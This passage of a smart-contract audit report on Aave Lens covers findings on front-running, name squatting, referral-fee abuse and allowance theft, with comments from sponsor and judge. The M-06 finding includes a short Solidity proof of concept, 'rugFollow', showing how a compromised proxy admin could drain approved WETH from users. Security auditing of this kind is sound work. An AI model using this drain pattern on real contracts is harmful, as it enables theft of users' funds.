whitelisted user may be compromised or become malicious at a later point in time. For that reason, I think this issue has some validity although due to the unlikely nature (requiring a faulty governance), I’ll mark this as <code>medium</code> risk for now.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125573841\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I disagree on the medium risk. Governance being faulty is not enough of a reason IMO. Like most governance-included protocols, governance getting compromised bears risks that are largely unavoidable.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125814379\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While I agree that a faulty governance is an extremely unlikely outcome. It isn’t stated in the README and as per the judges’ guidelines, profiles can be front-run under specific stated assumptions/external requirements. A malicious whitelisted profile creator can reasonably front-run other creators. </p>\n<p><code>2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1126095390\">Zer0dot (Aave Lens) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Fair enough, though we were aware of this— it’s clear it falls into a medium severity. We’re acknowledging this!</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-name-squatting\" style=\"position:relative;\"><a href=\"#m-04-name-squatting\" aria-label=\"m 04 name squatting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27\">[M-04] Name squatting</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/LensHub.sol#L142\">LensHub.sol#L142</a><br></p>\n<p>Creating profiles through <code>LensHub/PublishingLogic.createProfile</code> does not cost anything and will therefore result in “name squatting”.<br>\nA whitelisted profile creator will create many handles that are in demand, even if they don’t need them, just to flip them for a profit later.<br>\nThis ruins the experience for many high-profile users that can’t get their desired handle.</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider auctioning off handles to the highest bidder or at least taking a fee such that the cost of name squatting is not zero.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27\">donosonaumczuk (Aave Lens) disputed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27#issuecomment-1042215123\">oneski (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Declined. This is by design. Governance can allow contracts/addresses to mint. If governance allows a malicious actor that is the fault of governance. Governance can also allow contracts that implement auction or other functionality as well to manage the profile minting system.</p>\n<p>The protocol should take no opinion on this by default.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/27#issuecomment-1117274439\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I will mark this as <code>medium</code> risk for the same reasons outlined in <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1125814379\">M-03 (Issue #26)</a>.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-cashback-on-referral\" style=\"position:relative;\"><a href=\"#m-05-cashback-on-referral\" aria-label=\"m 05 cashback on referral permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20\">[M-05] Cashback on referral</a></h2>\n<p><em>Submitted by cmichel, also found by csanuragjain and gzeon</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/modules/collect/FeeCollectModule.sol#L99\">FeeCollectModule.sol#L99</a><br></p>\n<p>In the fee collect modules like <code>FeeCollectModule</code> there is no prevention of someone submitting a second profile they own as the <code>referrerProfileId</code> in <code>processCollect</code> to receive back part of the fees paid.</p>\n<p>The referral system is essentially broken as all rational agents will submit a second profile they control to get back part of the fees.\nOne could even create a referrer smart contract profile that anyone can submit which automatically refunds the fee received.\nA <a href=\"https://github.com/code-423n4/2021-11-nested-findings/issues/30\">similar royalties/referral fees issue</a> was judged high-severity recently.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>There’s no way to avoid this except by not allowing any profile as a referrer.<br>\nWhitelist certain important infrastructure providers, like different frontends, as referrers and only allow these to be used instead of users submitting their alt profiles.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1039791848\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Not sure if this makes sense, using your own referrer as a profile would basically be the equivalent of just having your publication collected directly without referral. In which case, what is the vulnerability?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1074354753\">donosonaumczuk (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I think they mean the case where Alice posts something and Bob wants to collect it. So Bob instead of just collecting directly from Alice publication, he creates a secondary profile, Bob2, mirrors publication through Bob2 and now Bob collects through Bob2’s mirror, basically using the referral fee as a collecting discount for himself.</p>\n<p>Even if we enforce referral profile owner to be different than collecting profile owner (aka comparing <code>ownerOf(profileId)</code> instead of <code>profileId</code>) people can just use different addresses for the purpose.</p>\n<p>I saw this before but I assumed most of people will use the frontend, which will handle this automatically. But I believe that in the long term is possible that people learn the trick and, as rational agents, use it. </p>\n<p>Awaiting for @Zer0dot thoughts on this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1074492445\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>I see, thanks @donosonaumczuk, at the end of the day this is a social protocol. Just like how on legacy social media, users can spam/abuse things, it’s a given here that we will never have a fully foolproof system. Plus, with the chain history being visible, tools can (and I’d like to see them) be built to filter out nasty behavior. @oneski want to weigh in?</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1079127042\">donosonaumczuk (Aave Lens) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>I think there is nothing more to do here.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1117647633\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I think its naive to think that this will be properly handled by the front-end and won’t be abused by users at some point in time. As such, I’m inclined to treat this as a valid <code>medium</code> risk issue because it fits the category of value leakage by the protocol. However, I can understand that there is no easy fix to this because it is impossible to link EOAs as originating from the same person.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1125239400\">Zer0dot (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Yeah I think that’s fair, since we’re dealing with a social protocol there’s a degree of social “etiquette” expected from users. Since this does not harm the protocol or the original publication creator, I don’t see it as a significant flaw. However, it does of course harm curators. I tend to disagree on the point about frontends @0xleastwood though, it seems to me that if this were to be a problem, it would be fairly straightforward to point fingers at those abusing the system.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1125801258\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While I understand an attacker would need to call functions directly to set this up, I’m not fully onboard with the idea that we could punish users who abuse the system in such a way. As per the judging guidelines, any issue that leaks value from the protocol is <code>medium</code> risk.</p>\n<p><code>2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</code></p>\n<p>I think its perfectly fine if this issue is acknowledged and you guys have decided to handle it through front-end design. However, it does not take away from the fact that it is still somewhat of an exploit.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/20#issuecomment-1126093212\">Zer0dot (Aave Lens) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Fair enough! We can roll with medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-imprecise-management-of-users-allowance-allows-the-admin-of-the-upgradeable-proxy-contract-to-rug-users\" style=\"position:relative;\"><a href=\"#m-06-imprecise-management-of-users-allowance-allows-the-admin-of-the-upgradeable-proxy-contract-to-rug-users\" aria-label=\"m 06 imprecise management of users allowance allows the admin of the upgradeable proxy contract to rug users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68\">[M-06] Imprecise management of users’ allowance allows the admin of the upgradeable proxy contract to rug users</a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p>In the current implementation, when there is a fee on follow or collect, users need to approve to the follow modules or collect module contract, and then the <code>Hub</code> contract can call <code>processFollow()</code> and transfer funds from an arbitrary address (as the <code>follower</code> parameter).</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FeeFollowModule.sol#L75-L91\">FeeFollowModule.sol#L75-L91</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">processFollow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">follower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_dataByProfile</span><span class=\"mtk1\">[</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currency</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_dataByProfile</span><span class=\"mtk1\">[</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">currency</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validateDataIsExpected</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">currency</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasuryFee</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_treasuryData</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_dataByProfile</span><span class=\"mtk1\">[</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasuryAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">treasuryFee</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">BPS_MAX</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">treasuryAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currency</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">follower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currency</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">follower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">, </span><span class=\"mtk12\">treasuryAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>A common practice is asking users to approve an unlimited amount to the contracts. Normally, the <code>allowance</code> can only be used by the user who initiated the transaction.</p>\n<p>It’s not a problem as long as <code>transferFrom</code> will always only transfer funds from <code>msg.sender</code> and the contract is non-upgradable.</p>\n<p>However, the <code>LensHub</code> contract is upgradeable, and <code>FeeFollowModule</code> will <code>transferFrom</code> an address decided by an input parameter <code>follower</code>, use of upgradeable proxy contract structure allows the logic of the contract to be arbitrarily changed.</p>\n<p>This allows the proxy admin to perform many malicious actions, including taking funds from users’ wallets up to the allowance limit.</p>\n<p>This action can be performed by the malicious/compromised proxy admin without any restriction.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Given:</p>\n<ul>\n<li>profileId <code>1</code> uses <code>FeeCollectModule</code> with <code>currency</code> = <code>WETH</code> and <code>amount</code> = <code>1e18</code></li>\n<li>Alice is rich (with 1,000,000 WETH in wallet balance)</li>\n<li>Alice <code>approve()</code> <code>type(uint256).max</code> to <code>FeeCollectModule</code> and <code>follow()</code> profileId <code>1</code> with <code>1e18 WETH</code>;</li>\n<li>A malicious/compromised proxy admin can call <code>upgradeToAndCall()</code> on the proxy contract and set a malicious contract as <code>newImplementation</code>, adding a new functions:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">rugFollow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">follower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">followModule</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IFollowModule</span><span class=\"mtk1\">(</span><span class=\"mtk12\">followModule</span><span class=\"mtk1\">).</span><span class=\"mtk11\">processFollow</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">follower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">profileIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ol start=\"3\">\n<li>The attacker creates a new profile with <code>FeeCollectModule</code> and set <code>currency</code> = <code>WETH</code> and <code>amount</code> = <code>1,000,000</code>, got profileId = <code>2</code></li>\n<li>The attacker <code>rugFollow()</code> with <code>follower</code> = <code>Alice</code>, profileId = <code>2</code>, stolen <code>1,000,000</code> WETH from Alice’s wallet</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Improper management of users’ <code>allowance</code> is the root cause of some of the biggest attacks in the history of DeFi security. We believe there are 2 rules that should be followed:</p>\n<ol>\n<li>the <code>from</code> of <code>transferFrom</code> should always be <code>msg.sender</code>;</li>\n<li>the contracts that hold users’ <code>allowance</code> should always be non-upgradable.</li>\n</ol>\n<p>We suggest adding a non-upgradeable contract for processing user payments:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">followWithFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currency</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currency</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profileIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">profileIds</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">datas</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">datas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IHUB</span><span class=\"mtk1\">(</span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">follow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">profileIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">datas</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This comes with an additional benefit: users only need to approve one contract instead of approving multiple <code>follow</code> or <code>collect</code> module contracts.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1072751986\">Zer0dot (Aave Lens) acknowledged, but disagreed with High severity and commented</a>:</strong></p>\n<blockquote>\n<p>This is true, but is within the acceptable risk model. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1117928564\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>While I agree with the warden, this assumes that the admin acts maliciously. As such, I think <code>medium</code> risk is more in line with a faulty governance.</p>\n</blockquote>\n<p><strong><a 